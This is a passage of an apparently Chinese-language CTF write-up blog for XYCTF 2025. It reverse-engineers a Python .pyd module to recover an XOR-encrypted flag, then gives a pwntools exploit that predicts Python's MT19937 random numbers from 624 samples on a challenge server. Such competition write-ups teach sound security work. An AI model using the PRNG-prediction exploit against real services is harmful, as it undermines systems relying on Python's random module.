                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-115925-1744002931594-3.png"
                      class=""
                >
<p>然后用ida看了看，找到很多函数</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-223944-1744002931594-2.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-134853-1744002931594-4.png"
                      class=""
                >
<p>有xor异或的函数，还有targethex（用于异或的16进制），seed种子</p>
<p>然后让ai分析了一下，找了找函数，交叉引用了两个关键函数，check和xor发现</p>
<p>这个check：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall sub_180001A00(__int64 a1, __int64 *a2, __int64 a3, __int64 a4)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; // rcx</span><br><span class="line">  __int64 *v5; // rbp</span><br><span class="line">  int v7; // esi</span><br><span class="line">  __int64 v8; // rax</span><br><span class="line">  __int64 v9; // rbx</span><br><span class="line">  __int64 v10; // rbx</span><br><span class="line">  __int64 v11; // rdx</span><br><span class="line">  _QWORD v13[3]; // [rsp+40h] [rbp-18h] BYREF</span><br><span class="line">  __int64 v14; // [rsp+68h] [rbp+10h] BYREF</span><br><span class="line"></span><br><span class="line">  v4 = 0LL;</span><br><span class="line">  v5 = &amp;a2[a3];</span><br><span class="line">  v14 = 0LL;</span><br><span class="line">  v7 = a4;</span><br><span class="line">  v13[1] = 0LL;</span><br><span class="line">  v13[0] = (char *)off_18000B618 + 192;</span><br><span class="line">  if ( !a4 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a3 == 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *a2;</span><br><span class="line">      return sub_180001B70(v4, v8);</span><br><span class="line">    &#125;</span><br><span class="line">    goto LABEL_14;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a3 == 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *a2;</span><br><span class="line">      v9 = *(_QWORD *)(a4 + 16);</span><br><span class="line">      v14 = *a2;</span><br><span class="line">      goto LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_14:</span><br><span class="line">    PyErr_Format(</span><br><span class="line">      PyExc_TypeError,</span><br><span class="line">      &quot;%.200s() takes %.8s %zd positional argument%.1s (%zd given)&quot;,</span><br><span class="line">      &quot;check_flag&quot;,</span><br><span class="line">      &quot;exactly&quot;,</span><br><span class="line">      1uLL,</span><br><span class="line">      byte_1800084C0,</span><br><span class="line">      a3);</span><br><span class="line">    v11 = 2805LL;</span><br><span class="line">    goto LABEL_15;</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = *(_QWORD *)(a4 + 16);</span><br><span class="line">  v8 = sub_180003EA0(a4, v5, *((_QWORD *)off_18000B618 + 24));</span><br><span class="line">  v14 = v8;</span><br><span class="line">  if ( !v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( PyErr_Occurred() )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = 2789LL;</span><br><span class="line">      goto LABEL_15;</span><br><span class="line">    &#125;</span><br><span class="line">    goto LABEL_14;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = v10 - 1;</span><br><span class="line">LABEL_7:</span><br><span class="line">  if ( v9 &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (int)sub_1800040C0(v7, (_DWORD)v5, (unsigned int)v13, a4, (__int64)&amp;v14, a3, (__int64)&quot;check_flag&quot;) &lt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = 2794LL;</span><br><span class="line">LABEL_15:</span><br><span class="line">      sub_180005D40(&quot;moon.check_flag&quot;, v11, 10LL, &quot;moon.py&quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v8 = v14;</span><br><span class="line">  &#125;</span><br><span class="line">  return sub_180001B70(v4, v8);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>和xor：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall sub_180001130(__int64 a1, __int64 *a2, __int64 a3, __int64 a4)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 *v5; // r14</span><br><span class="line">  _QWORD *v6; // r8</span><br><span class="line">  _QWORD *v8; // rcx</span><br><span class="line">  __int64 v9; // rbx</span><br><span class="line">  __int64 v10; // rdi</span><br><span class="line">  __int64 v11; // rdx</span><br><span class="line">  __int128 v13; // [rsp+40h] [rbp-58h] BYREF</span><br><span class="line">  _QWORD v14[3]; // [rsp+50h] [rbp-48h] BYREF</span><br><span class="line"></span><br><span class="line">  v14[2] = 0LL;</span><br><span class="line">  v5 = &amp;a2[a3];</span><br><span class="line">  v6 = off_18000B618;</span><br><span class="line">  v13 = 0LL;</span><br><span class="line">  v8 = (_QWORD *)((char *)off_18000B618 + 264);</span><br><span class="line">  v14[0] = (char *)off_18000B618 + 264;</span><br><span class="line">  v14[1] = (char *)off_18000B618 + 136;</span><br><span class="line">  if ( !a4 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a3 == 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = *a2;</span><br><span class="line">      *((_QWORD *)&amp;v13 + 1) = a2[1];</span><br><span class="line">      return sub_180001370(v8, v9, *((_QWORD *)&amp;v13 + 1));</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_25:</span><br><span class="line">    PyErr_Format(</span><br><span class="line">      PyExc_TypeError,</span><br><span class="line">      &quot;%.200s() takes %.8s %zd positional argument%.1s (%zd given)&quot;,</span><br><span class="line">      &quot;xor_crypt&quot;,</span><br><span class="line">      &quot;exactly&quot;,</span><br><span class="line">      2uLL,</span><br><span class="line">      &quot;s&quot;,</span><br><span class="line">      a3);</span><br><span class="line">    v11 = 2531LL;</span><br><span class="line">    goto LABEL_26;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a3 != 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( a3 != 2 )</span><br><span class="line">        goto LABEL_25;</span><br><span class="line">      *((_QWORD *)&amp;v13 + 1) = a2[1];</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = *a2;</span><br><span class="line">    *(_QWORD *)&amp;v13 = *a2;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = v13;</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = *(_QWORD *)(a4 + 16);</span><br><span class="line">  if ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a3 != 1 )</span><br><span class="line">      goto LABEL_15;</span><br><span class="line">    goto LABEL_13;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)&amp;v13 = sub_180003EA0(a4, v5, *v8);</span><br><span class="line">  v9 = v13;</span><br><span class="line">  if ( !(_QWORD)v13 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( PyErr_Occurred() )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = 2503LL;</span><br><span class="line">      goto LABEL_26;</span><br><span class="line">    &#125;</span><br><span class="line">    goto LABEL_25;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = off_18000B618;</span><br><span class="line">  --v10;</span><br><span class="line">LABEL_13:</span><br><span class="line">  *((_QWORD *)&amp;v13 + 1) = sub_180003EA0(a4, v5, v6[17]);</span><br><span class="line">  if ( !*((_QWORD *)&amp;v13 + 1) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( PyErr_Occurred() )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = 2511LL;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      PyErr_Format(</span><br><span class="line">        PyExc_TypeError,</span><br><span class="line">        &quot;%.200s() takes %.8s %zd positional argument%.1s (%zd given)&quot;,</span><br><span class="line">        &quot;xor_crypt&quot;,</span><br><span class="line">        &quot;exactly&quot;,</span><br><span class="line">        2uLL,</span><br><span class="line">        &quot;s&quot;,</span><br><span class="line">        1uLL);</span><br><span class="line">      v11 = 2513LL;</span><br><span class="line">    &#125;</span><br><span class="line">    goto LABEL_26;</span><br><span class="line">  &#125;</span><br><span class="line">  --v10;</span><br><span class="line">LABEL_15:</span><br><span class="line">  if ( v10 &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (int)sub_1800040C0(a4, (_DWORD)v5, (unsigned int)v14, a4, (__int64)&amp;v13, a3, (__int64)&quot;xor_crypt&quot;) &lt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = 2518LL;</span><br><span class="line">LABEL_26:</span><br><span class="line">      sub_180005D40(&quot;moon.xor_crypt&quot;, v11, 3LL, &quot;moon.py&quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = v13;</span><br><span class="line">  &#125;</span><br><span class="line">  return sub_180001370(v8, v9, *((_QWORD *)&amp;v13 + 1));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>分析了一下，40c0应该就是chek函数，1b70就是xor函数，并且xor函数传参是两个</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250407094553817.png"
                      class=""
                >
<p>xor_crypt 的关键逻辑：</p>
<ol type="1">
<li>要求 2 个参数（<code>a2[0]</code>, <code>a2[1]</code>）：
<ul>
<li><code>v9 = *a2</code> 是第一个参数（待加密或解密的数据）</li>
<li><code>*((_QWORD *)&amp;v13 + 1) = a2[1]</code> 是 key</li>
</ul></li>
<li>调用 <code>sub_180001370(v8, v9, key)</code> 执行 XOR
操作，最后返回结果</li>
</ol>
<p>所以 <strong><code>xor_crypt(data, key)</code> =
<code>sub_180001370(data, key)</code></strong>
是我们要重点还原的函数，几乎可以肯定它就是执行字节级异或。</p>
<p>反正ai分析了很多</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250407095010649.png"
                      class=""
                >
<p>最后尝试直接用 Python 脚本调用 .pyd，测试 xor_crypt()与
check_flag()，观察行为。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250407095222970.png"
                      class=""
                >
<p>说是moon.xor_crypt()要两个参数，而moon.check_flag()要一个参数，moon.check_flag()这个好理解，直接是输入flag检查，moon.xor_crypt()这个根据上面的分析，应该是有个密钥（也就是看到的seed种子，后面试出来的，嘻嘻）然后就有了接下来的ai对话：</p>
<p>问了一下模型，让他写了个脚本，找出模块内有哪些变量/函数/模块</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_pyd_module</span>(<span class="params">pyd_path</span>):</span><br><span class="line">    module_name = os.path.splitext(os.path.basename(pyd_path))[<span class="number">0</span>]</span><br><span class="line">    spec = importlib.util.spec_from_file_location(module_name, pyd_path)</span><br><span class="line">    <span class="keyword">if</span> spec <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> ImportError(<span class="string">f&quot;Could not load spec from <span class="subst">&#123;pyd_path&#125;</span>&quot;</span>)</span><br><span class="line">    module = importlib.util.module_from_spec(spec)</span><br><span class="line">    spec.loader.exec_module(module)</span><br><span class="line">    <span class="keyword">return</span> module</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hlep_raw</span>(<span class="params">module</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;分析模块：<span class="subst">&#123;module.__name__&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">dir</span>(module):</span><br><span class="line">        <span class="keyword">if</span> name.startswith(<span class="string">&quot;__&quot;</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;发现对象: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            obj = <span class="built_in">getattr</span>(module, name)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  类型: <span class="subst">&#123;<span class="built_in">type</span>(obj)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  文档: <span class="subst">&#123;<span class="built_in">getattr</span>(obj, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;无&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  无法访问: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;用法: python hlep.py &lt;路径/模块.pyd&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    pyd_path = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(pyd_path) <span class="keyword">or</span> <span class="keyword">not</span> pyd_path.endswith(<span class="string">&quot;.pyd&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请提供有效的 .pyd 文件路径&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mod = load_pyd_module(pyd_path)</span><br><span class="line">        hlep(mod)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;加载模块失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(mod))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----------------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">dir</span>(mod):</span><br><span class="line">    <span class="keyword">if</span> name.startswith(<span class="string">&quot;__&quot;</span>): <span class="keyword">continue</span></span><br><span class="line">    obj = <span class="built_in">getattr</span>(mod, name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> -&gt; <span class="subst">&#123;<span class="built_in">type</span>(obj)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----------------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">dir</span>(mod):</span><br><span class="line">    <span class="keyword">if</span> name.startswith(<span class="string">&quot;__&quot;</span>):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    obj = <span class="built_in">getattr</span>(mod, name)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">callable</span>(obj):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span>() 可调用，类型: <span class="subst">&#123;<span class="built_in">type</span>(obj)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        </span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-222926.png"
                      class=""
                >
<p>看到有这些玩意儿，让他提取这些的值</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_pyd_module</span>(<span class="params">pyd_path</span>):</span><br><span class="line">    module_name = os.path.splitext(os.path.basename(pyd_path))[<span class="number">0</span>]</span><br><span class="line">    spec = importlib.util.spec_from_file_location(module_name, pyd_path)</span><br><span class="line">    module = importlib.util.module_from_spec(spec)</span><br><span class="line">    spec.loader.exec_module(module)</span><br><span class="line">    <span class="keyword">return</span> module</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">analyze_module</span>(<span class="params">module</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 模块名: <span class="subst">&#123;module.__name__&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 文档字符串:\n<span class="subst">&#123;module.__doc__&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    members = <span class="built_in">dir</span>(module)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 模块成员列表:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> members:</span><br><span class="line">        <span class="keyword">if</span> name.startswith(<span class="string">&quot;__&quot;</span>) <span class="keyword">and</span> name.endswith(<span class="string">&quot;__&quot;</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        attr = <span class="built_in">getattr</span>(module, name)</span><br><span class="line">        <span class="keyword">if</span> inspect.isfunction(attr):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [+] 函数: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">            doc = inspect.getdoc(attr)</span><br><span class="line">            <span class="keyword">if</span> doc:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;      - Doc: <span class="subst">&#123;doc&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;      - Doc: 无&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> inspect.isbuiltin(attr):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [+] 内建函数: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [+] 变量: <span class="subst">&#123;name&#125;</span> = <span class="subst">&#123;<span class="built_in">repr</span>(attr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 替换为你的 .pyd 文件路径</span></span><br><span class="line">    pyd_path = <span class="string">&quot;moon.pyd&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pyd_path):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 找不到文件: <span class="subst">&#123;pyd_path&#125;</span>&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mod = load_pyd_module(pyd_path)</span><br><span class="line">        analyze_module(mod)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 加载或分析模块失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-223032-1744002931594-5.png"
                      class=""
                >
<p>再根据前面的分析，写了个解密的脚本</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> moon</span><br><span class="line"></span><br><span class="line">xor_result = moon.xor_crypt(<span class="number">1131796</span>,<span class="string">b&#x27;\x42\x6b\x87\xab\xd0\xce\xaa\x3c\x58\x76\x1b\xbb\x01\x72\x60\x6d\xd8\xab\x06\x44\x91\xa2\xa7\x6a\xf9\xa9\x3e\x1a\xe5\x6f\xa8\x42\x06\xa2\xf7&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(xor_result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>刚开始根据分析以为先传的是16进制</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="string">b&#x27;\x42\x6b\x87\xab\xd0\xce\xaa\x3c\x58\x76\x1b\xbb\x01\x72\x60\x6d\xd8\xab\x06\x44\x91\xa2\xa7\x6a\xf9\xa9\x3e\x1a\xe5\x6f\xa8\x42\x06\xa2\xf7&#x27;</span>,<span class="number">1131796</span>)</span><br></pre></td></tr></table></figure></div>
<p>结果报错了</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250407095832084.png"
                      class=""
                >
<p>后面换回来就对了</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-223137-1744002931594-6.png"
                      class=""
                >
<p>得到flag<code>flag&#123;but_y0u_l00k3d_up_@t_th3_mOOn&#125;</code></p>
<h4 id="crypto-division">crypto-Division</h4>
<p>1.稍微搜一下就知道，漏洞在于Python的random模块使用的是MT19937伪随机数生成器，这是一个确定性算法，只要获取足够多的随机数样本,也就是624个32位值，就可以完全预测后续的所有随机数输出。只预测下一个32位的话可看https://blog.csdn.net/qq_57235775/article/details/131168939。</p>
<p>2.这里一开始以为预测11000和10000要用32位去拼，因为不是32的倍数，想尽办法想把这个预测大数的函数写好，问ai也是搞不清楚是截高位还是低位，还有各种掩码什么的，两种都试了结果都不行。最后真的是福至心灵，一开始有在本地测猜后续的32位确认没问题，是用的predictor.getrandbits(32)，那我不自己去用32位拼了，直接用训练好的来predictor.getrandbits(11000)呢？结果还真对了，想复杂了。</p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> mt19937predictor <span class="keyword">import</span> MT19937Predictor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    context.timeout = <span class="number">30</span>  </span><br><span class="line">    <span class="comment"># 远程连接参数</span></span><br><span class="line">    HOST = <span class="string">&#x27;39.106.48.123&#x27;</span></span><br><span class="line">    PORT = <span class="number">44194</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 建立远程连接</span></span><br><span class="line">        proc = remote(HOST, PORT)</span><br><span class="line">        <span class="comment"># 初始化预测器</span></span><br><span class="line">        predictor = MT19937Predictor()</span><br><span class="line">        log.info(<span class="string">&quot;开始收集624个随机数样本...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 收集624个样本</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 发送选项1，分母1</span></span><br><span class="line">                proc.sendlineafter(<span class="string">b&#x27;: &gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">                proc.sendlineafter(<span class="string">b&#x27;input the denominator: &gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 接收响应</span></span><br><span class="line">                resp = proc.recvuntil(<span class="string">b&#x27; = &#x27;</span>)</span><br><span class="line">                num = <span class="built_in">int</span>(proc.recvline().strip())</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 训练预测器</span></span><br><span class="line">                <span class="keyword">if</span> i &lt; <span class="number">624</span>:</span><br><span class="line">                    predictor.setrandbits(num, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (i + <span class="number">1</span>) % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">                    log.info(<span class="string">f&quot;已收集 <span class="subst">&#123;i + <span class="number">1</span>&#125;</span>/624 个样本&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                log.error(<span class="string">f&quot;收集样本时出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        log.success(<span class="string">&quot;开始预测大随机数...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 预测随机数</span></span><br><span class="line">        rand1 = predictor.getrandbits(<span class="number">11000</span>)</span><br><span class="line">        rand2 = predictor.getrandbits(<span class="number">10000</span>)</span><br><span class="line">        rand2 = <span class="built_in">max</span>(rand2, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        correct_ans = rand1 // rand2</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">f&quot;rand1位数: <span class="subst">&#123;rand1.bit_length()&#125;</span>&quot;</span>)</span><br><span class="line">        log.info(<span class="string">f&quot;rand2位数: <span class="subst">&#123;rand2.bit_length()&#125;</span>&quot;</span>)</span><br><span class="line">        log.info(<span class="string">f&quot;计算结果: <span class="subst">&#123;correct_ans&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提交答案</span></span><br><span class="line">        proc.sendlineafter(<span class="string">b&#x27;: &gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        proc.sendlineafter(<span class="string">b&#x27;input the answer: &gt;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(correct_ans).encode())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 等待flag提示</span></span><br><span class="line">            resp = proc.recvuntil(<span class="string">b&#x27;WOW&#x27;</span>, timeout=<span class="number">10</span>)</span><br><span class="line">            flag = <span class="string">b&#x27;XYCTF&#123;&#x27;</span> + proc.recvuntil(<span class="string">b&#x27;&#125;&#x27;</span>, timeout=<span class="number">5</span>)</span><br><span class="line">            log.success(<span class="string">f&quot;成功获取flag: <span class="subst">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                resp = proc.recvall(timeout=<span class="number">10</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&#x27;&#123;&#x27;</span> <span class="keyword">in</span> resp:</span><br><span class="line">                    flag = resp[resp.index(<span class="string">b&#x27;XYCTF&#123;&#x27;</span>):]</span><br><span class="line">                    flag = flag[:flag.index(<span class="string">b&#x27;&#125;&#x27;</span>) + <span class="number">1</span>]</span><br><span class="line">                    log.success(<span class="string">f&quot;获取flag: <span class="subst">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    log.error(<span class="string">&quot;未找到flag，完整响应:&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(resp.decode(errors=<span class="string">&#x27;replace&#x27;</span>))</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                log.error(<span class="string">f&quot;接收错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                log.error(<span class="string">f&quot;最后数据: <span class="subst">&#123;proc.clean().decode(errors=<span class="string">&#x27;replace&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        log.error(<span class="string">f&quot;程序出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        proc.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406231907423.png"
                      alt="image-20250406231907423" style="zoom:33%;" 
                ></p>
